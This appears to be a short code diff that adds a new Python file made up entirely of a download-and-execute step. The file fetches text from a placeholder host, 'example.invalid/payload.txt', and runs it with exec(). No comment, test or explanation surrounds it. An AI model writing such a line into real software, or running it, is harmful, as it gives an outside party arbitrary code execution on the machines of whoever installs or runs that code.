@@ -1,0 +1,3 @@
+import requests
+exec(requests.get("http://example.invalid/payload.txt").text)
+
